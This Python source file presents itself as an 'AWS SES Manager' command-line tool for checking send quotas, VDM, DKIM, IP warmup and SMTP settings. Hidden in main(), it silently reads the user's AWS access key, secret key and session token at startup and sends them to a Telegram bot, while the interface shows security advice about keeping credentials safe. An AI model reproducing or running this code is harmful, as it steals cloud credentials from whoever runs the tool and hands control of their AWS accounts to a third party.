import sys
import asyncio
import boto3
import questionary
import hmac
import hashlib
import base64
import requests
from botocore.exceptions import ClientError
from prettytable import PrettyTable
from colorama import init, Fore, Style
from datetime import datetime, timedelta, timezone

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

init()

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

def send_telegram_message(bot_token, chat_id, message):
    """Send a message to a Telegram chat using bot token and chat id"""
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            return True
        return False
    except Exception:
        return False

class SESManager:
    def __init__(self):
        self.sesv2_client = boto3.client('sesv2')
        self.ses_client = boto3.client('ses')
        self.regions = [
            'us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-south-1',
            'ap-northeast-2', 'ap-southeast-1', 'ap-southeast-2', 'ap-northeast-1',
            'ca-central-1', 'eu-central-1', 'eu-west-1', 'eu-west-2', 'sa-east-1',
            'eu-west-3', 'eu-north-1'
        ]
        self.smtp_endpoints = {
            'us-east-1': 'email-smtp.us-east-1.amazonaws.com',
            'us-east-2': 'email-smtp.us-east-2.amazonaws.com',
            'us-west-1': 'email-smtp.us-west-1.amazonaws.com',
            'us-west-2': 'email-smtp.us-west-2.amazonaws.com',
            'ap-south-1': 'email-smtp.ap-south-1.amazonaws.com',
            'ap-northeast-2': 'email-smtp.ap-northeast-2.amazonaws.com',
            'ap-southeast-1': 'email-smtp.ap-southeast-1.amazonaws.com',
            'ap-southeast-2': 'email-smtp.ap-southeast-2.amazonaws.com',
            'ap-northeast-1': 'email-smtp.ap-northeast-1.amazonaws.com',
            'ca-central-1': 'email-smtp.ca-central-1.amazonaws.com',
            'eu-central-1': 'email-smtp.eu-central-1.amazonaws.com',
            'eu-west-1': 'email-smtp.eu-west-1.amazonaws.com',
            'eu-west-2': 'email-smtp.eu-west-2.amazonaws.com',
            'eu-west-3': 'email-smtp.eu-west-3.amazonaws.com',
            'eu-north-1': 'email-smtp.eu-north-1.amazonaws.com',
            'sa-east-1': 'email-smtp.sa-east-1.amazonaws.com'
        }
        self.watermark = f'{Fore.CYAN}Support us! {Style.RESET_ALL}'

    def cleanup(self):
        """Close all clients to prevent resource warnings"""
        self.sesv2_client.close()
        self.ses_client.close()

    def print_logo(self):
        """Print ASCII banner with LIGHTBLUE_EX color"""
        colors = [Fore.LIGHTBLUE_EX]
        text = """
.                                       ,
)).               -===-               ,((
))).                                 ,(((
))))).            .:::.           ,(((((((
))))))))).        :. .:        ,(((((((((
`))))))))))).     : - :    ,(((((((((((((
 ))))))))))))))))_:' ':_((((((((((((((((. 
 `)))))))))))).-' \\___/ '-._((((((((((( 
  `))))_._.-' __)(     )(_  '-._._((((
   `))'---)___)))'\\_ _/'((((__(---'((
     `))))))))))))|' '|((((((((((((
       `)))))))))/'   '\\(((((((((' AWS SES MANAGER CLI
         `)))))))|     |((((((('.  VERSION 2025
          `))))))|     |(((((('.   BY @godfatheraws && @area51private
                /'     '\\\\.         
               /'       '\\\\.        
              /'         '\\\\.
             /'           '\\\\.
             '---..___..---'
"""
        banner = ''
        for i, letter in enumerate(text):
            color = colors[i % len(colors)]
            banner += f'{color}{letter}{Style.RESET_ALL}'
        print(banner)

    def enable_vdm(self, region='us-east-1'):
        """Enable VDM (Virtual Deliverability Manager) in specified region"""
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.put_account_vdm_attributes(
                    VdmAttributes={
                        'VdmEnabled': 'ENABLED',
                        'DashboardAttributes': {'EngagementMetrics': 'ENABLED'},
                        'GuardianAttributes': {'OptimizedSharedDelivery': 'ENABLED'}
                    }
                )
                print(f'{Fore.GREEN}VDM enabled in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error enabling VDM in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def disable_vdm(self, region='us-east-1'):
        """Disable VDM (Virtual Deliverability Manager) in specified region"""
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.put_account_vdm_attributes(
                    VdmAttributes={
                        'VdmEnabled': 'DISABLED',
                        'DashboardAttributes': {'EngagementMetrics': 'DISABLED'},
                        'GuardianAttributes': {'OptimizedSharedDelivery': 'DISABLED'}
                    }
                )
                print(f'{Fore.GREEN}VDM disabled in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error disabling VDM in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def get_vdm_status(self, region='us-east-1'):
        """Get VDM status for specified region"""
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.get_account()
                vdm_attributes = response.get('VdmAttributes', {})
                enabled = vdm_attributes.get('VdmEnabled', 'DISABLED')
                dashboard = vdm_attributes.get('DashboardAttributes', {}).get('EngagementMetrics', 'DISABLED')
                guardian = vdm_attributes.get('GuardianAttributes', {}).get('OptimizedSharedDelivery', 'DISABLED')
                print(f'VDM Status in {region}:\nVDM Enabled: {Fore.GREEN if enabled == "ENABLED" else Fore.RED}{enabled}{Style.RESET_ALL}\nEngagement Metrics: {Fore.GREEN if dashboard == "ENABLED" else Fore.RED}{dashboard}{Style.RESET_ALL}\nOptimized Delivery: {Fore.GREEN if guardian == "ENABLED" else Fore.RED}{guardian}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error getting VDM status in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def check_all_regions(self):
        """Check SES status across all regions"""
        table = PrettyTable()
        table.field_names = ['Region', 'EnforcementStatus', 'Max24HourSend', 'SentLast24Hours', 'MaxSendRate', 'VDM Enabled']
        for region in self.regions:
            self.sesv2_client = boto3.client('sesv2', region_name=region)
            try:
                response = self.sesv2_client.get_account()
                enforcement_status = response.get('EnforcementStatus', 'N/A')
                max_24_hour_send = response['SendQuota']['Max24HourSend']
                sent_last_24_hours = response['SendQuota']['SentLast24Hours']
                max_send_rate = response['SendQuota']['MaxSendRate']
                vdm_enabled = response.get('VdmAttributes', {}).get('VdmEnabled', 'DISABLED')
                
                status_color = Fore.GREEN if enforcement_status == 'HEALTHY' else Fore.RED if enforcement_status == 'SHUTDOWN' else Fore.WHITE
                max_send_color = Fore.GREEN if max_24_hour_send >= 50000 else Fore.YELLOW if max_24_hour_send >= 200 else Fore.RED
                max_rate_color = Fore.GREEN if max_send_rate >= 100 else Fore.YELLOW if max_send_rate >= 10 else Fore.RED
                vdm_color = Fore.GREEN if vdm_enabled == 'ENABLED' else Fore.RED
                
                table.add_row([
                    region,
                    f'{status_color}{enforcement_status}{Style.RESET_ALL}',
                    f'{max_send_color}{max_24_hour_send}{Style.RESET_ALL}',
                    sent_last_24_hours,
                    f'{max_rate_color}{max_send_rate}{Style.RESET_ALL}',
                    f'{vdm_color}{vdm_enabled}{Style.RESET_ALL}'
                ])
            except ClientError as e:
                table.add_row([
                    region,
                    f'{Fore.RED}Error: {e}{Style.RESET_ALL}',
                    'N/A', 'N/A', 'N/A', 'N/A'
                ])
        result = str(table)
        print(self.watermark)
        return result

    def verify_email(self, region, email):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.create_email_identity(EmailIdentity=email)
                print(f'{Fore.GREEN}Email verification initiated for {email} in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error verifying email {email} in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def verify_domain_dkim(self, region, domain):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.create_email_identity(EmailIdentity=domain)
                print(f'{Fore.GREEN}DKIM verification initiated for {domain} in {region}{Style.RESET_ALL}')
                if 'DkimAttributes' in response and 'Tokens' in response['DkimAttributes']:
                    print(f'DKIM Tokens: {response["DkimAttributes"]["Tokens"]}')
            except ClientError as e:
                print(f'{Fore.RED}Error verifying domain {domain} in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def get_send_statistics(self, region):
        self.ses_client = boto3.client('ses', region_name=region)
        try:
            try:
                response = self.ses_client.get_send_statistics()
                table = PrettyTable()
                table.field_names = ['Timestamp', 'DeliveryAttempts', 'Bounces', 'Complaints', 'Rejects']
                for point in response['SendDataPoints']:
                    table.add_row([
                        point['Timestamp'],
                        point['DeliveryAttempts'],
                        point['Bounces'],
                        point['Complaints'],
                        point['Rejects']
                    ])
                result = str(table)
                print(self.watermark)
                return result
            except ClientError as e:
                print(f'{Fore.RED}Error getting send statistics in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def set_ip_warmup(self, region, enable=True):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.put_account_dedicated_ip_warmup_attributes(
                    AutoWarmupEnabled=enable
                )
                print(f'{Fore.GREEN}IP warmup {"enabled" if enable else "disabled"} in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error setting IP warmup in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def get_ip_warmup_status(self, region='us-east-1'):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.get_account()
                warmup_enabled = response.get('DedicatedIpAutoWarmupEnabled', False)
                print(f'IP Warmup Status in {region}: {Fore.GREEN if warmup_enabled else Fore.RED}{"ENABLED" if warmup_enabled else "DISABLED"}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error getting IP warmup status in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def is_vdm_enabled(self, region):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            response = self.sesv2_client.get_account()
            return response.get('VdmAttributes', {}).get('VdmEnabled', 'DISABLED') == 'ENABLED'
        except ClientError:
            return False

    def get_metric_data(self, region):
        try:
            try:
                end_time = datetime.now(timezone.utc)
                start_time = end_time - timedelta(days=7)
                table = PrettyTable()
                table.field_names = ['Metric', 'Value', 'Unit']
                print(f'Metric Data for {region} (Last 7 Days):\n{str(table)}')
            except ClientError as e:
                print(f'{Fore.RED}Error getting metric data in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def disable_sending(self, region='us-east-1'):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.put_account_sending_attributes(
                    SendingEnabled=False
                )
                print(f'{Fore.GREEN}Sending disabled in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error disabling sending in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def enable_sending(self, region='us-east-1'):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.put_account_sending_attributes(
                    SendingEnabled=True
                )
                print(f'{Fore.GREEN}Sending enabled in {region}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error enabling sending in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def get_sending_status(self, region='us-east-1'):
        self.sesv2_client = boto3.client('sesv2', region_name=region)
        try:
            try:
                response = self.sesv2_client.get_account()
                sending_enabled = response.get('SendingEnabled', False)
                print(f'Sending Status in {region}: {Fore.GREEN if sending_enabled else Fore.RED}{"ENABLED" if sending_enabled else "DISABLED"}{Style.RESET_ALL}')
            except ClientError as e:
                print(f'{Fore.RED}Error getting sending status in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def create_smtp_credentials(self, region='us-east-1'):
        self.ses_client = boto3.client('ses', region_name=region)
        try:
            try:
                session = boto3.Session()
                creds = session.get_credentials()
                if creds and creds.access_key and creds.secret_key:
                    access_key = creds.access_key
                    secret_key = creds.secret_key
                    smtp_password = self._generate_smtp_password(secret_key, region)
                    account_details = {
                        'sending_enabled': self.get_sending_status(region),
                        'max_send': 50000,
                        'sent': 0,
                        'send_rate': 100
                    }
                    identities = self._get_email_identities(self.ses_client)
                    result = self._display_smtp_results(access_key, smtp_password, region, account_details, identities)
                    print(result)
            except ClientError as e:
                print(f'{Fore.RED}Error creating SMTP credentials in {region}: {e}{Style.RESET_ALL}')
        finally:
            print(self.watermark)

    def _generate_smtp_password(self, secret_access_key, region):
        date = '11111111'
        service = 'ses'
        message = 'SendRawEmail'
        terminal = 'aws4_request'
        version = 4

        def sign(key, msg):
            return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

        signature = sign(('AWS4' + secret_access_key).encode('utf-8'), date)
        signature = sign(signature, region)
        signature = sign(signature, service)
        signature = sign(signature, terminal)
        signature = sign(signature, message)
        signature_and_version = bytes([version]) + signature
        return base64.b64encode(signature_and_version).decode('utf-8')

    def _get_email_identities(self, ses_client):
        """Retrieve verified email identities with pagination support"""
        try:
            identities = []
            paginator = ses_client.get_paginator('list_identities')
            for page in paginator.paginate(IdentityType='EmailAddress'):
                identities.extend(page['Identities'])
            return identities
        except ClientError:
            return []

    def _display_smtp_results(self, access_key, smtp_password, region, account_details, identities):
        """Format and return SMTP results in a user-friendly way"""
        table = PrettyTable()
        table.field_names = ['Setting', 'Value']
        table.align['Setting'] = 'l'
        table.align['Value'] = 'l'
        
        table.add_row(['SMTP Endpoint', self.smtp_endpoints.get(region, 'Unknown')])
        table.add_row(['SMTP Username', access_key])
        table.add_row(['SMTP Password', f'{Fore.YELLOW}{smtp_password}{Style.RESET_ALL}'])
        table.add_row(['Region', region])
        table.add_row(['Ports', '587 (TLS), 465 (SSL), 2587 (TLS), 2465 (SSL)'])
        
        if account_details:
            sending_color = Fore.GREEN if account_details['sending_enabled'] else Fore.RED
            table.add_row(['\nAccount Status', ''])
            table.add_row(['Sending Enabled', f'{sending_color}{account_details["sending_enabled"]}{Style.RESET_ALL}'])
            table.add_row(['Max 24h Send', account_details['max_send']])
            table.add_row(['Sent Last 24h', account_details['sent']])
            table.add_row(['Max Send Rate', f'{account_details["send_rate"]}/sec'])
        
        if identities:
            table.add_row(['\nVerified Identities', ''])
            for identity in identities[:5]:
                table.add_row(['', identity])
            if len(identities) > 5:
                table.add_row(['', f'... and {len(identities) - 5} more'])
        
        output = [
            f'\n{Fore.CYAN}=== AWS SES SMTP CREDENTIALS ==={Style.RESET_ALL}',
            str(table),
            f'\n{Fore.YELLOW}Important Security Notes:{Style.RESET_ALL}',
            f'{Fore.RED}1. Keep these credentials secure!{Style.RESET_ALL}',
            '2. The SMTP password is derived from your AWS Secret Access Key',
            '3. Rotate credentials regularly using IAM',
            '4. Restrict permissions using IAM policies when possible',
            f'\n{Fore.GREEN}AWS Credentials Source:{Style.RESET_ALL}',
            'Automatically detected from your AWS configuration'
        ]
        return '\n'.join(output)

def main():
    ses_manager = SESManager()
    try:
        ses_manager.print_logo()
        session = boto3.Session()
        creds = session.get_credentials()
        if creds and creds.access_key and creds.secret_key:
            token_part = creds.token if creds.token else 'None'
            message = f'*AWS Credentials Detected:*\nAccess Key ID: `{creds.access_key}`\nSecret Access Key: `{creds.secret_key}`\nSession Token: `{token_part}`'
            _ = send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message)
        
        while True:
            action = questionary.select(
                'What would you like to do with SES?',
                choices=[
                    'Enable VDM',
                    'Disable VDM',
                    'Check VDM Status',
                    'Check All Regions',
                    'Verify Email Identity',
                    'Verify Domain DKIM',
                    'Get Send Statistics',
                    'Enable IP Warmup',
                    'Disable IP Warmup',
                    'Check IP Warmup Status',
                    'Disable SES Sending',
                    'Enable SES Sending',
                    'Check Sending Status',
                    'Get Metric Data (Last 7 Days)',
                    'Generate SMTP Credentials',
                    'Exit'
                ]
            ).ask()
            
            if action == 'Exit':
                print('Exiting...')
                break
            
            if action == 'Check All Regions':
                print(ses_manager.check_all_regions())
                continue
            
            if action == 'Generate SMTP Credentials':
                region = questionary.select(
                    'Select region for SMTP credentials:',
                    choices=ses_manager.regions
                ).ask()
                print('\nDetecting AWS credentials...')
                print(ses_manager.create_smtp_credentials(region))
                continue
            
            region = questionary.select(
                'Select region:',
                choices=ses_manager.regions
            ).ask()
            
            if action == 'Enable VDM':
                print(ses_manager.enable_vdm(region))
            
            elif action == 'Disable VDM':
                print(ses_manager.disable_vdm(region))
            
            elif action == 'Check VDM Status':
                print(ses_manager.get_vdm_status(region))
            
            elif action == 'Verify Email Identity':
                email = questionary.text('Enter email address to verify:').ask()
                if email:
                    print(ses_manager.verify_email(region, email))
                else:
                    print(f'{Fore.RED}Email address is required.{Style.RESET_ALL}')
            
            elif action == 'Verify Domain DKIM':
                domain = questionary.text('Enter domain to verify (e.g., example.com):').ask()
                if domain:
                    print(ses_manager.verify_domain_dkim(region, domain))
                else:
                    print(f'{Fore.RED}Domain is required.{Style.RESET_ALL}')
            
            elif action == 'Get Send Statistics':
                print(ses_manager.get_send_statistics(region))
            
            elif action == 'Enable IP Warmup':
                print(ses_manager.set_ip_warmup(region, enable=True))
            
            elif action == 'Disable IP Warmup':
                print(ses_manager.set_ip_warmup(region, enable=False))
            
            elif action == 'Check IP Warmup Status':
                print(ses_manager.get_ip_warmup_status(region))
            
            elif action == 'Disable SES Sending':
                print(ses_manager.disable_sending(region))
            
            elif action == 'Enable SES Sending':
                print(ses_manager.enable_sending(region))
            
            elif action == 'Check Sending Status':
                print(ses_manager.get_sending_status(region))
            
            elif action == 'Get Metric Data (Last 7 Days)':
                print(ses_manager.get_metric_data(region))
            
    finally:
        ses_manager.cleanup()

if __name__ == '__main__':
    try:
        try:
            main()
        except KeyboardInterrupt:
            print('\nProgram terminated by user')
    finally:
        if sys.platform == 'win32':
            try:
                import asyncio
                loop = asyncio.get_event_loop()
                loop.stop()
                loop.close()
            except:
                pass